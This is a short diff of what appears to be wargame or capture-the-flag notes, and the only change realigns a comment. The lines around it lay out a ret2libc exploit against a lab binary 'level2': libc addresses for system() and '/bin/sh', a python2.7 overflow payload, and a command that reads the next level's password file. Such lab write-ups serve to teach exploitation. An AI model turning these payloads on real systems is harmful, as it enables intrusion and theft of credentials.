@@ -15,7 +15,7 @@ find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
 # Random RET
 080484d2 c3              RET
 
-#                                               ... RET              ... system                    ... "/bin/sh"
+#                            ... RET              ... system                    ... "/bin/sh"
 python2.7 -c 'print("X"*80 + "\xd2\x84\x04\x08" + "\x60\xb0\xe6\xb7" + "XXXX" + "\x58\xcc\xf8\xb7")' > /tmp/exploit.txt
 cat /tmp/exploit.txt /dev/stdin | ./level2
 cat /home/user/level3/.pass
